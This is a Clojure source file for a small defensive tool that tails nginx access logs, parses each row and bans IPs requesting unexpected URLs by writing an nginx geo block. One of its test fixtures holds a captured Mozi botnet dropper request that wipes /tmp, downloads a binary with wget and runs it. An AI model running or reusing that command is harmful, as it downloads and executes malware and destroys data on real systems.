(ns nginx-saviour.core
  (:require [taoensso.timbre :as log]
            [clojure.java.io :as io]
            [clj-time.format :as f]
            [clj-time.coerce :as coerce]
            [clojure.edn :as edn]
            [clojure.spec.alpha :as s]
            [clojure.test :refer [is]]
            [clojure.core.async :as async]
            [clojure-watch.core :refer [start-watch]]
            [clojure.java.shell :refer [sh]])
  (:gen-class))

(defn exists?
  [file]
  (.exists (io/as-file file)))

(defn print-exit
  [msg]
  (println msg)
  (System/exit 0))

(defonce banned-ip-list-atom (atom []))
(defonce watch-atom (atom nil))
(defonce process-atom (atom nil))
(defonce client-atom (atom {}))
(def initial-args-state {:folder-path    {:parse-fn (fn [x]
                                                      (cond
                                                        (not (s/conform string? x)) (print-exit (str x " is not a string"))
                                                        (not (exists? x)) (print-exit (str x " does not exists."))
                                                        (not (clojure.string/ends-with? x "/")) (print-exit (str x " does not end with /"))
                                                        :else x)
                                                      )
                                          :type     String
                                          :desc     "Path to the folder where the <file-name> is located in."
                                          :key      ["-p" "--path"]
                                          :value    nil}
                         :file-name      {:parse-fn (fn [x]
                                                      (cond
                                                        (not (s/conform string? x)) (print-exit (str x " is not a string"))
                                                        :else x))
                                          :type     String
                                          :desc     "Name of the file located inside <folder-path>"
                                          :key      ["-f" "--file"]
                                          :value    nil}
                         :banned-ip-file {:parse-fn (fn [x]
                                                      (cond
                                                        (not (s/conform string? x)) (print-exit (str x " is not a string"))
                                                        :else x))
                                          :type     String
                                          :desc     "Name of the file to write blacklisted IPs to"
                                          :key      ["-b" "--banned"]
                                          :value    nil}
                         })

(defonce args-atom (atom nil))
(when (nil? (deref args-atom))
  (reset! args-atom initial-args-state))

(defn in?
  "x is in xs?"
  [xs x]
  (some (fn [xx] (= x xx)) xs))

(defn print-help
  []
  (println "\nnginx-saviour usage:\n")
  (doseq [[_ {:keys [desc key]}] (deref args-atom)]
    (println "\t" (clojure.string/join ", " key) "\t\t" desc))
  (println "\t -h, --help" "\t\t" "Print this message"))

(defn parse-args
  [args args-state]
  (if (not= (count (keys args)) (count (keys args-state)))
    (do
      (print-help)
      (print-exit (str "Missing arguments: " args)))
    (let [id-keys (->> (map vector (keys args-state) (map :key (vals args-state))) (into []))]
      (reduce-kv (fn [args-state input-arg-key input-arg-val]
                   (let [args-key (some (fn [[k keys]]
                                          (when (in? keys input-arg-key)
                                            k)) id-keys)]
                     (if args-key
                       (assoc-in args-state [args-key :value] (apply (get-in args-state [args-key :parse-fn]) [input-arg-val]))
                       (print-exit (str "Unable to find argument for " input-arg-key " with value " input-arg-val)))))
                 args-state args))))

(def fields [:remote-addr :remote-user :time :request :status :body-bytes-sent :http-referer :http-user-agent :original])

(s/conform string? nil)

(def message-channel (async/chan))
(def exit-channel (async/chan))
(def data-channel (async/chan))

(defonce c (->> "config.edn" io/resource slurp edn/read-string))
(defn get-config [] c)
(def path-to-watch (:file-to-watch (get-config)))

(defn abs [n] (max n (- n)))

(defn tail-process
  "Builder for that outputs a whole file then tails it and wait for new data in the file."
  [file-path]
  (ProcessBuilder. ["tail" "-fn+1" file-path]))

(defn start-process
  "Start a process."
  [process]
  (.start process))

(defn destroy
  "Destroy a process."
  [process]
  (.destroy process))

(defn put-log-rows-on-channel
  "Reads a async fil and put each line on a channel, requires a started process."
  []
  (async/go
    (with-open [stdout (io/reader (.getInputStream (deref process-atom)))]
      (loop []
        (when-let [line (.readLine stdout)]
          (async/>! message-channel line)
          (recur))))))

(defn remove-bracets
  [s]
  (clojure.string/replace s #"\[|\]" ""))

(defn get-date-from-log-row
  "Extracts the date inside bracets from a log row. It validates that the first field is an ip, then a remote user."
  [row]
  (->> (re-find #"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}\s-(.*)-\s\[\d{2}\/\w{3}\/\d{4}:\d{2}:\d{2}:\d{2}\s\+\d{4}]\s" row)
       first
       (re-find #"\[.*\]")))

(defn str->pattern
  "Convert a string into a regex pattern, i.e escaping stuff."
  [string]
  (let [regex-char-esc-smap (let [esc-chars "[]()&^%$#!?*.+"]
                              (zipmap esc-chars
                                      (map #(str "\\" %) esc-chars)))]
    (->> string
         (replace regex-char-esc-smap)
         (reduce str)
         re-pattern)))

(defn remove-date
  "Remove the date [...] from a log row because I'm unable to exclude that when splitting on spaces.....:)"
  [row]
  (as-> (get-date-from-log-row row) $
        (str->pattern $)
        (clojure.string/replace row $ "")))

(defn split-row-on-space
  "Splits a row on spaces but keeps spaces that is inside quotes"
  [row]
  (clojure.string/split row #"\s+(?=([^\"]*\"[^\"]*\")*[^\"]*$)"))

(def ^:dynamic *timestamp-format* "dd/MMM/yyy:HH:mm:ss Z")

(defn parse-datetime [timestamp]
  (f/parse (f/formatter *timestamp-format*) timestamp))

(defn date-within?
  [{:keys [d1 d2 millis-margin]}]
  (>= (abs (- (coerce/to-long d2) (coerce/to-long d1))) millis-margin))

(defn parse-request
  "Parse the request entry in a log row"
  {:test (fn []
           (is (= (parse-request "GET /portal/redlion HTTP/1.1") {:http-method "GET" :url "/portal/redlion" :protocol "HTTP/1.1"})))}
  [request]
  (try
    (let [parsed (re-find #"(.+) (.*) (HTTP\/?\d?\.?\d?)" request)]
      {:http-method (nth parsed 1)
       :url         (nth parsed 2)
       :protocol    (last parsed)})
    (catch Exception e
      (log/error "Invalid request - " e - request)
      {:http-method nil
       :url         nil
       :protocol    nil})))

(defn get-ip
  "Finds an IP in a raw log row"
  {:test (fn []
           (let [row "202.83.44.98 - - [23/Sep/2020:10:14:51 +0000] \"GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1\" 1233 162 \"-\" \"Hello, world\""
                 row2 " - - [23/Sep/2020:10:14:51 +0000] \"GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+202.83.44.98jaws HTTP/1.1\" 1233 162 \"-\" \"Hello, world\""]
             (is (= (get-ip row) "202.83.44.98"))
             (is (= (get-ip row2) nil))))}
  [row]
  (->> row
       (re-find #"^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})")
       first))

(defn parse-row
  "excepts a default log row format
  '$remote_addr - $remote_user [$time_local] '\"$request\" $status $body_bytes_sent \"$http_referer\" \"$http_user_agent\"';"
  {:test (fn []
           (let [row "41.213.138.16 - - [23/Sep/2020:08:10:38 +0000] 7%3b%23&remoteSubmit=Save 400 166 - -"
                 process (parse-row row)]
             (is (= process
                    {:remote-addr     "41.213.138.16"
                     :remote-user     "-"
                     :time            (parse-datetime "23/Sep/2020:08:10:38 +0000")
                     :request         {:http-method nil
                                       :url         nil
                                       :protocol    nil}
                     :status          "400"
                     :body-bytes-sent "166"
                     :http-referer    "-"
                     :http-user-agent "-"
                     :original        row}))))}
  [row]
  (try
    (let [columns (-> (remove-date row) split-row-on-space)
          data (zipmap fields columns)]
      (-> data
          (assoc :time (-> row
                           get-date-from-log-row
                           remove-bracets
                           parse-datetime))
          (assoc :original row)
          (assoc :request (parse-request (:request data)))))
    (catch Exception e
      ;; may be some strange row, atleast we can parse some rows and we should be ablel to get the ip
      (log/error e))))

(defn initiate-tail-process!
  [file-name]
  (reset! process-atom (->
                         (str path-to-watch file-name)
                         tail-process
                         start-process)))

(defn cancel-message-channel
  []
  (async/go (async/>! exit-channel :exit)))

(defn banned?
  [log-row]
  (in? (deref banned-ip-list-atom) (get-ip log-row)))

(defn consume-log-rows-from-channel
  []
  ;; not sure if it's necessary to cancel these loops, maybe they get garbage collected?
  (async/go
    (loop [coll (async/alts! [exit-channel message-channel] :priority true)]
      (let [[data channel] coll]
        (cond
          (= channel exit-channel) (log/debug "Killing signal!!")
          (nil? data) (log/debug "Channel closed")
          (banned? data) (do (log/debug (str data " is banned and should not show up here?!"))
                             (recur (async/alts! [exit-channel message-channel] :priority true)))
          :else (let [data (parse-row data)
                      remote-addr (:remote-addr data)]
                  (log/debug "Data..." remote-addr)
                  (if (contains? (deref client-atom) remote-addr)
                    (swap! client-atom update-in [remote-addr] (fn [reqs] (conj reqs data)))
                    (swap! client-atom assoc remote-addr [data]))
                  (async/>! data-channel data)
                  (recur (async/alts! [exit-channel message-channel] :priority true))))))))

(defn valid-url?
  "Check if a url is valid, for now, the only valid is /"
  [url]
  (= url "/"))

(defn write-to-file!
  [ip]
  (spit (get-in (deref args-atom) [:banned-ip-file :value]) (str ip "\n") :append true))

(defn write-ips-to-file-nginx-style!
  [ips]
  (let [ips (clojure.string/join " 1;\n " ips)]
    (spit (get-in (deref args-atom) [:banned-ip-file :value]) (str "geo $bad_ip {\n default 0;\n " ips " 1;\n}"))))

(defn consume-data-channel
  []
  (async/go-loop []
    (let [{:keys [request remote-addr]} (async/<! data-channel)]
      (swap! client-atom dissoc remote-addr)                ;; why do we even save the stuff in an atom, we just going to remove it anyway
      (when (not (valid-url? (:url request)))
        (swap! banned-ip-list-atom conj remote-addr)
        (write-ips-to-file-nginx-style! (deref banned-ip-list-atom)))
      (recur))))

(defn process-file!
  "Asynchronous process a file by putting new lines on a channel and operating on the client atom"
  []
  (do
    (put-log-rows-on-channel)
    (consume-log-rows-from-channel)
    (consume-data-channel)))

(defn restart-file-process!
  [file-name]
  (do
    (destroy (deref process-atom))
    (cancel-message-channel)
    (initiate-tail-process! file-name)
    (process-file!)))

(defn start-dir-watch
  [{:keys [path file-name]}]
  (reset! watch-atom (start-watch [{:path        path
                                    :event-types [:create]
                                    :callback    (fn [event filename]
                                                   (condp = event
                                                     ;; the log has rotated
                                                     :create (when (= filename (str path file-name))
                                                               (restart-file-process! file-name))
                                                     :delete nil
                                                     :modify nil))}])))

(defn stop-watch
  []
  (-> watch-atom
      deref
      (apply nil)))

(comment

  (destroy (deref process-atom))

  (start-dir-watch {:path      path-to-watch
                    :file-name "test.log"})

  (initiate-tail-process! "test.log")
  (process-file!)

  (destroy (deref process-atom))

  ;; superb!
  ;; https://www.initpals.com/nginx/how-to-block-requests-from-specific-ip-address-in-nginx/
  )

(defn -main
  " I don't do a whole lot ... yet but something now!. "
  [& args]

  (if (some (fn [x] (or (= x "--help") (= x "-h"))) args)
    (do
      (print-help)
      (System/exit 0))
    (reset! args-atom (parse-args (apply hash-map args) (deref args-atom))))


  (start-dir-watch {:path      (get-in (deref args-atom) [:folder-path :value])
                    :file-name (get-in (deref args-atom) [:file-name :value])})

  (initiate-tail-process! (get-in (deref args-atom) [:file-name :value]))

  (process-file!)
  )


